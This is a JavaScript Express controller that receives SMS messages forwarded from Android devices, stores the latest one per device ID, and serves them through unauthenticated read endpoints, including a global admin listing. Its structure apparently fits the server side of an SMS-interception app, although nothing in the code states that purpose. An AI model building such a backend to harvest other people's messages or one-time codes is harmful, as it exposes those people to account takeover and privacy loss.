import Sms from "../models/Sms.js";
import Device from "../models/Device.js";

/* ✅ GET — Fetch all SMS globally (optional for admin view) */
export const getAllSms = async (req, res) => {
  try {
    const smsList = await Sms.find().sort({ createdAt: -1 });
    res.json({ success: true, message: "Fetched all SMS", data: smsList });
  } catch (err) {
    console.error("❌ Error fetching SMS:", err);
    res.status(500).json({ success: false, message: "Server error", error: err.message });
  }
};

/* ✅ GET — Fetch SMS by uniqueId (specific device) */
export const getSmsByDeviceId = async (req, res) => {
  try {
    const { id } = req.params;
    const smsList = await Sms.find({ deviceId: id }).sort({ createdAt: -1 });
    res.json({ success: true, message: "Fetched SMS for device", data: smsList });
  } catch (err) {
    console.error("❌ Error fetching SMS:", err);
    res.status(500).json({ success: false, message: "Server error", error: err.message });
  }
};

/* ✅ POST — Global route to receive SMS from Android */
export const receiveSmsFromDevice = async (req, res) => {
  try {
    const { sender, senderNumber, receiverNumber, body, timestamp, uniqueid } = req.body;

    if (!uniqueid || !receiverNumber || !body) {
      return res.status(400).json({
        success: false,
        message: "uniqueid, receiverNumber, and body are required",
      });
    }

    // 🔍 Find device (optional, skip if not needed)
    const device = await Device.findOne({ uniqueId: uniqueid });
    if (!device) {
      console.warn("⚠️ Device not found for uniqueid:", uniqueid);
    }

    // 🔁 Overwrite or Create one SMS per device
    let sms = await Sms.findOne({ deviceId: uniqueid });

    if (sms) {
      sms.from = senderNumber || sender || "Unavailable";
      sms.to = receiverNumber;
      sms.body = body;
      sms.sentAt = timestamp ? new Date(timestamp) : new Date();
      await sms.save();
    } else {
      sms = await Sms.create({
        deviceId: uniqueid,
        from: senderNumber || sender || "Unavailable",
        to: receiverNumber,
        body,
        sentAt: timestamp ? new Date(timestamp) : new Date(),
      });
    }

    res.json({
      success: true,
      message: "SMS saved successfully",
      data: sms,
    });
  } catch (err) {
    console.error("❌ Error saving SMS:", err);
    res.status(500).json({
      success: false,
      message: "Server error while saving SMS",
      error: err.message,
    });
  }
};
